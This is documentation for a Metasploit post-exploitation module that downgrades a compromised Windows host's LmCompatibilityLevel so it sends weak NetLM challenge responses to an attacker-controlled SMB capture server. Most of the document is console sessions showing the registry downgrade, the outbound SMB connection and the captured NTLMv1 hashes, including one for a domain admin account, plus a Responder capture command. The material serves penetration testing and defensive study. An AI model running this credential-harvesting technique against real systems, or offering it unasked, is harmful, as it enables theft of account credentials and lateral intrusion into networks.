## Vulnerable Application

This module changes the system `LmCompatibilityLevel` registry value
to enable sending LM challenge hashes and initiates a SMB connection
to the host specified in the SMBHOST module option. If an SMB server
is listening, it will receive the NetLM hashes for the session user.


## Verification Steps

1. Start msfconsole
2. Get a session
3. Do: `use post/windows/gather/netlm_downgrade`
4. Do: `set SESSION <session id>`
5. Start a SMB server to capture hashes
6. Do: `set SMBHOST <SMB server IP address>`
7. Do: `run`

## Options


### SMBHOST

IP address of SMB server to capture hashes.


## Scenarios

### Windows 11 Pro 10.0.22000 Build 22000 x64

```
msf6 > use auxiliary/server/capture/smb
msf6 auxiliary(server/capture/smb) > run
[*] Auxiliary module running as background job 2.

[*] Server is running. Listening on 0.0.0.0:445
[*] Server started.
msf6 auxiliary(server/capture/smb) > use post/windows/gather/netlm_downgrade 
msf6 post(windows/gather/netlm_downgrade) > set session 1
session => 1
msf6 post(windows/gather/netlm_downgrade) > run

[*] Running module against WINDEV2110EVAL (192.168.200.140)
[*] NetLM authentication is disabled (LmCompatibilityLevel: nil). Enabling ...
[+] NetLM authentication is enabled
[*] Establishing SMB connection to 192.168.200.130
[+] Received SMB connection on Auth Capture Server!
[SMB] NTLMv1-SSP Client     : 192.168.200.140
[SMB] NTLMv1-SSP Username   : WINDEV2110EVAL\User
[SMB] NTLMv1-SSP Hash       : User::WINDEV2110EVAL:414a0d26193abde800000000000000000000000000000000:44d90728eeb025c1dcf4730a0282422614cbc8e590e99a11:b0e33cde858f04d5

[+] SMB server 192.168.200.130 should now have NetLM hashes
[*] Restoring original LM compatibility level (LmCompatibilityLevel: nil)
[*] Post module execution completed
msf6 post(windows/gather/netlm_downgrade) > 
```

### Windows Server 2008 SP1 (x64)

```
msf6 > use auxiliary/server/capture/smb
msf6 auxiliary(server/capture/smb) > run
[*] Auxiliary module running as background job 2.

[*] Server is running. Listening on 0.0.0.0:445
[*] Server started.
msf6 auxiliary(server/capture/smb) > use post/windows/gather/netlm_downgrade 
msf6 post(windows/gather/netlm_downgrade) > set smbhost 192.168.200.130
smbhost => 192.168.200.130
msf6 post(windows/gather/netlm_downgrade) > set session 1
session => 1
msf6 post(windows/gather/netlm_downgrade) > run

[*] Running module against WIN-17B09RRRJTG (192.168.200.218)
[*] NetLM authentication is disabled (LmCompatibilityLevel: 3). Enabling ...
[+] NetLM authentication is enabled (LmCompatibilityLevel: 0)
[*] Establishing SMB connection to 192.168.200.130
[+] Received SMB connection on Auth Capture Server!
[SMB] NTLMv1-SSP Client     : 192.168.200.218
[SMB] NTLMv1-SSP Username   : CORP\corpadmin
[SMB] NTLMv1-SSP Hash       : corpadmin::CORP:de7f490cc7f7f8a700000000000000000000000000000000:8a34755c17fdbd4f1d7338b5ed7617e2000f071f05869f2e:c30fd80a6709381b

[+] SMB server 192.168.200.130 should now have NetLM hashes
[*] Restoring original LM compatibility level (LmCompatibilityLevel: 3)
[*] Post module execution completed
msf6 post(windows/gather/netlm_downgrade) > 
```

Alternatively, the SMB connection can captured using [Responder](https://github.com/lgandx/Responder):

```
$ sudo responder -A -I eth0 --lm -v

[...]

[SMB] NTLMv1 Client   : 192.168.200.218
[SMB] NTLMv1 Username : CORP\corpadmin
[SMB] NTLMv1 Hash     : corpadmin::CORP:3FFCF0AED51EF9784B17BF71859355CA0FF968A42BF925D4:3FFCF0AED51EF9784B17BF71859355CA0FF968A42BF925D4:07168acbca2d7e8e
```

